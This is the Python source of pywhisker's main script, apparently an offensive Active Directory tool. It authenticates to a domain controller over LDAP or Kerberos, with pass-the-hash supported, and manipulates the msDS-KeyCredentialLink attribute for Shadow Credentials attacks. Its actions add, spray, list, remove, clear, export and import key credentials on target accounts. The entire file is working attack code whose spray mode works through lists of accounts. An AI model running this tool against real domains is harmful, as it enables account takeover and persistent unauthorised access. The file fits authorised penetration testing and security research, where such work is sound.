#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : pywhisker.py
# Author             : Charlie Bromberg (@_nwodtuhs) & Podalirius (@podalirius_)
# Date created       : 29 Jul 2021

import traceback
from binascii import unhexlify

from impacket.smbconnection import SMBConnection
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
import argparse

import os
import ssl
import sys
import ldap3

from rich.console import Console
console = Console()

from pywhisker.Logger import Logger
logger = Logger()

from pywhisker.ShadowCredentials import ShadowCredentials

def get_machine_name(args, domain):
    if args.dc_ip is not None:
        s = SMBConnection(args.dc_ip, args.dc_ip)
    else:
        s = SMBConnection(domain, domain)
    try:
        s.login('', '')
    except Exception:
        if s.getServerName() == '':
            raise Exception('Error while anonymous logging into %s' % domain)
    else:
        s.logoff()
    return s.getServerName() + '.' + s.getServerDNSDomainName()


def init_ldap_connection(target, tls_version, args, domain, username, password, lmhash, nthash):
    user = '%s\\%s' % (domain, username)
    connect_to = target
    if args.dc_ip is not None:
        connect_to = args.dc_ip
    if tls_version is not None:
        use_ssl = True
        port = 636
        tls = ldap3.Tls(validate=ssl.CERT_NONE, version=tls_version)
    else:
        use_ssl = False
        port = 389
        tls = None
    ldap_server = ldap3.Server(connect_to, get_info=ldap3.ALL, port=port, use_ssl=use_ssl, tls=tls)
    if args.use_kerberos:
        ldap_session = ldap3.Connection(ldap_server)
        ldap_session.bind()
        ldap3_kerberos_login(ldap_session, target, username, password, domain, lmhash, nthash, args.auth_key, kdcHost=args.dc_ip)
    elif args.auth_hashes is not None:
        if lmhash == "":
            lmhash = "aad3b435b51404eeaad3b435b51404ee"
        ldap_session = ldap3.Connection(ldap_server, user=user, password=lmhash + ":" + nthash, authentication=ldap3.NTLM, auto_bind=True)
    else:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=password, authentication=ldap3.NTLM, auto_bind=True)

    return ldap_server, ldap_session


def init_ldap_session(args, domain, username, password, lmhash, nthash):
    if args.use_kerberos:
        target = get_machine_name(args, domain)
    else:
        if args.dc_ip is not None:
            target = args.dc_ip
        else:
            target = domain

    if args.use_ldaps is True:
        try:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1_2, args, domain, username, password, lmhash, nthash)
        except ldap3.core.exceptions.LDAPSocketOpenError:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1, args, domain, username, password, lmhash, nthash)
    else:
        return init_ldap_connection(target, None, args, domain, username, password, lmhash, nthash)


def ldap3_kerberos_login(connection, target, user, password, domain='', lmhash='', nthash='', aesKey='', kdcHost=None, TGT=None, TGS=None, useCache=True):
    from pyasn1.codec.ber import encoder, decoder
    from pyasn1.type.univ import noValue
    """
    logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
    :param string user: username
    :param string password: password for the user
    :param string domain: domain where the account is valid for (required)
    :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
    :param string nthash: NTHASH used to authenticate using hashes (password is not used)
    :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
    :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
    :param struct TGT: If there's a TGT available, send the structure here and it will be used
    :param struct TGS: same for TGS. See smb3.py for the format
    :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
    :return: True, raises an Exception if error.
    """

    if lmhash != '' or nthash != '':
        if len(lmhash) % 2:
            lmhash = '0' + lmhash
        if len(nthash) % 2:
            nthash = '0' + nthash
        try:  # just in case they were converted already
            lmhash = unhexlify(lmhash)
            nthash = unhexlify(nthash)
        except TypeError:
            pass

    # Importing down here so pyasn1 is not required if kerberos is not used.
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    import datetime

    if TGT is not None or TGS is not None:
        useCache = False

    if useCache:
        try:
            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
        except Exception as e:
            # No cache present
            print(e)
            pass
        if ccache is not None:
            # retrieve domain information from CCache file if needed
            if domain == '':
                domain = ccache.principal.realm['data'].decode('utf-8')
                logger.debug('Domain retrieved from CCache: %s' % domain)

            logger.debug('Using Kerberos Cache: %s' % os.getenv('KRB5CCNAME'))
            principal = 'ldap/%s@%s' % (target.upper(), domain.upper())

            creds = ccache.getCredential(principal)
            if creds is None:
                # Let's try for the TGT and go from there
                principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
                creds = ccache.getCredential(principal)
                if creds is not None:
                    TGT = creds.toTGT()
                    logger.debug('Using TGT from cache')
                else:
                    logger.debug('No valid credentials found in cache')
            else:
                TGS = creds.toTGS(principal)
                logger.debug('Using TGS from cache')

            # retrieve user information from CCache file if needed
            if user == '' and creds is not None:
                user = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
                logger.debug('Username retrieved from CCache: %s' % user)
            elif user == '' and len(ccache.principal.components) > 0:
                user = ccache.principal.components[0]['data'].decode('utf-8')
                logger.debug('Username retrieved from CCache: %s' % user)

    # First of all, we need to get a TGT for the user
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    if TGT is None:
        if TGS is None:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash, aesKey, kdcHost)
    else:
        tgt = TGT['KDC_REP']
        cipher = TGT['cipher']
        sessionKey = TGT['sessionKey']

    if TGS is None:
        serverName = Principal('ldap/%s' % target, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
    else:
        tgs = TGS['KDC_REP']
        cipher = TGS['cipher']
        sessionKey = TGS['sessionKey']

        # Let's build a NegTokenInit with a Kerberos REQ_AP

    blob = SPNEGO_NegTokenInit()

    # Kerberos
    blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

    # Let's extract the ticket from the TGS
    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs['ticket'])

    # Now let's build the AP_REQ
    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = []
    apReq['ap-options'] = constants.encodeFlags(opts)
    seq_set(apReq, 'ticket', ticket.to_asn1)

    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = domain
    seq_set(authenticator, 'cname', userName.components_to_asn1)
    now = datetime.datetime.utcnow()

    authenticator['cusec'] = now.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now)

    encodedAuthenticator = encoder.encode(authenticator)

    # Key Usage 11
    # AP-REQ Authenticator (includes application authenticator
    # subkey), encrypted with the application session key
    # (Section 5.5.1)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

    blob['MechToken'] = encoder.encode(apReq)

    request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO',
                                                  blob.getData())

    # Done with the Kerberos saga, now let's get into LDAP
    if connection.closed:  # try to open connection if closed
        connection.open(read_server_info=False)

    connection.sasl_in_progress = True
    response = connection.post_send_single_response(connection.send('bindRequest', request, None))
    connection.sasl_in_progress = False
    if response[0]['result'] != 0:
        raise Exception(response)

    connection.bound = True

    return True

def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='Python (re)setter for property msDS-KeyCredentialLink for Shadow Credentials attacks.')
    target = parser.add_mutually_exclusive_group(required=True)
    target.add_argument("-t", "--target", type=str, dest="target_samname", help="Target account")
    target.add_argument("-tl", "--target-list", type=str, dest="target_samname_list", help="Path to a file with target accounts names (one per line)")

    parser.add_argument("-a", "--action", choices=['list', 'add', 'spray', 'remove', 'clear', 'info', 'export', 'import'], nargs='?', default='list', help='Action to operate on msDS-KeyCredentialLink')
    parser.add_argument('--use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
    parser.add_argument("-v", "--verbose", dest="verbosity", action="count", default=0, help="verbosity level (-v for verbose, -vv for debug)")
    parser.add_argument("-q", "--quiet", dest="quiet", action="store_true", default=False, help="show no information at all")

    authconn = parser.add_argument_group('authentication & connection')
    authconn.add_argument('--dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter')
    authconn.add_argument("-d", "--domain", dest="auth_domain", metavar="DOMAIN", action="store", help="(FQDN) domain to authenticate to")
    authconn.add_argument("-u", "--user", dest="auth_username", metavar="USER", action="store", help="user to authenticate with")
    authconn.add_argument("-td", "--target-domain", type=str, dest="target_domain", help="Target domain (if different than the domain of the authenticating user)")

    secret = parser.add_argument_group()
    cred = secret.add_mutually_exclusive_group()
    cred.add_argument('--no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    cred.add_argument("-p", "--password", dest="auth_password", metavar="PASSWORD", action="store", help="password to authenticate with")
    cred.add_argument("-H", "--hashes", dest="auth_hashes", action="store", metavar="[LMHASH:]NTHASH", help='NT/LM hashes, format is LMhash:NThash')
    cred.add_argument('--aes-key', dest="auth_key", action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    secret.add_argument("-k", "--kerberos", dest="use_kerberos", action="store_true", help='Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')

    add = parser.add_argument_group('arguments when setting -action to add')
    add.add_argument("-P", "--pfx-password", action='store', help='password for the PFX stored self-signed certificate (will be random if not set, not needed when exporting to PEM)')
    add.add_argument("-f", "--filename", action='store', help='filename to store the generated self-signed PEM or PFX certificate and key, or filename for the "import"/"export" actions')
    add.add_argument("-e", "--export", action='store', choices=["PEM","PFX"], type = lambda s : s.upper(), default="PFX", help='choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))')

    remove = parser.add_argument_group('arguments when setting -action to remove')
    remove.add_argument("-D", "--device-id", action='store', help='device ID of the KeyCredentialLink to remove when setting -action to remove')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    if (args.action == "remove" or args.action == "info") and args.device_id is None:
        parser.error("the following arguments are required when setting -action == remove or info: -D/--device-id")

    if args.action == "import" and args.filename is None:
        parser.error("the following arguments are required when setting -action == import or info: -f/--filename")

    return args


def main():

    args = parse_args()
    logger = Logger(args.verbosity, args.quiet)
    

    #if args.action == 'write' and args.delegate_from is None:
        #logger.error('`-delegate-from` should be specified when using `-action write` !')
        #sys.exit(1)

    if args.target_samname_list and args.action != 'spray':
        logger.error('`--target-list` should be specified only when using `--action spray` !')
        sys.exit(1)

    if args.target_samname_list:
        if os.path.isfile(args.target_samname_list):
            with open(args.target_samname_list, 'r') as f:
                target_samname = f.read().splitlines()
        else:
            logger.error(f'File {args.target_samname_list} does not exist!')
            sys.exit(1)
    else:
        target_samname = args.target_samname

    target_domain = args.target_domain

    auth_lm_hash = ""
    auth_nt_hash = ""
    if args.auth_hashes is not None:
        if ":" in args.auth_hashes:
            auth_lm_hash = args.auth_hashes.split(":")[0]
            auth_nt_hash = args.auth_hashes.split(":")[1]
        else:
            auth_nt_hash = args.auth_hashes

    try:
        ldap_server, ldap_session = init_ldap_session(args=args, domain=args.auth_domain, username=args.auth_username, password=args.auth_password, lmhash=auth_lm_hash, nthash=auth_nt_hash)
        shadowcreds = ShadowCredentials(ldap_server, ldap_session, target_samname, args, target_domain)
        if args.action == 'list':
            shadowcreds.list()
        elif args.action == 'add':
            shadowcreds.add(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain, args=shadowcreds.args, target_domain=target_domain, )
        elif args.action == 'spray':
            shadowcreds.spray(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain, target_domain=target_domain)
        elif args.action == 'remove':
            shadowcreds.remove(args.device_id)
        elif args.action == 'info':
            shadowcreds.info(args.device_id)
        elif args.action == 'clear':
            shadowcreds.clear()
        elif args.action == 'export':
            shadowcreds.exportToJSON(filename=args.filename)
        elif args.action == 'import':
            shadowcreds.importFromJSON(filename=args.filename)
    except Exception as e:
        if args.verbosity >= 1:
            traceback.print_exc()
        logger.error(str(e))

if __name__ == '__main__':
    main()